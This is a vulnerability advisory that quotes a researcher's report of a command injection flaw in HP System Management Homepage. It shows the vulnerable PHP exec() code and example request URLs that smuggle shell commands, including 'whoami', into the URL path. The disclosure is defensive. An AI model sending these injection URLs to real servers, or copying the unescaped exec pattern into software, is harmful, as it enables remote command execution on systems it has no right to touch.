HP System Management Homepage contains a command injection vulnerability

Markus Wulftange from Daimler TSS reports:


The vulnerability is located in the `ginkgosnmp.inc` PHP file in the `C:\hp\hpsmh\data\smhutil` or `/opt/hp/hpsmh/data/smhutil` directory, respectively. Inside the `ginkgosnmp.inc` script, the last path segment of the current requested URL path is used in a `exec` call without proper escaping:

$tempfilename = "$sessiondir/" . substr($_SERVER["SCRIPT_URL"], 1 + strrpos($_SERVER["SCRIPT_URL"], '/')) . uniqid(".", true) . time() . ".txt";

[...]

if("Linux" == PHP_OS)
$cmd = "../../webapp-data/webagent/csginkgo -f$tempfilename";
else
{
$windrive = substr( $_SERVER["WINDIR"], 0, 2 );
$cmd = "$windrive\\hp\\hpsmh\\data\\smhutil\\csginkgo.exe -f$tempfilename";
}

exec( $cmd, $out );

This script is reachable via the URL path `https://<host>:2381/smhutil/snmpchp.php.en`. Due to [Apache’s *MultiViews*] [2] it can also be referenced with any additional path segments after the `snmpchp.php.en` segment: `https://<host>:2381/smhutil/snmpchp.php.en/foo/bar` still triggers `https://<host>:2381/smhutil/snmpchp.php.en` but `$_SERVER["SCRIPT_URL"]` is `https://<host>:2381/smhutil/snmpchp.php.en/foo/bar`. This can be exploited as follows:

https://<host>:2381/smhutil/snmpchp.php.en/&&<cmd>&&echo (full file name)
https://<host>:2381/smhutil/snmpchp.php/&&<cmd>&&echo (without "en" language indicator)
https://<host>:2381/smhutil/snmpchp/&&<cmd>&&echo (without any file name extension)

Besides the path segment separator `/`, the characters `<`, `>`, and `|` are also not allowed, which makes exploiting this vulnerability a little hard.

https://<host>:2381/smhutil/snmpchp/&&whoami&&echo

A remote authenticated user may be able to run arbitrary commands on the HP System Management Homepage server.
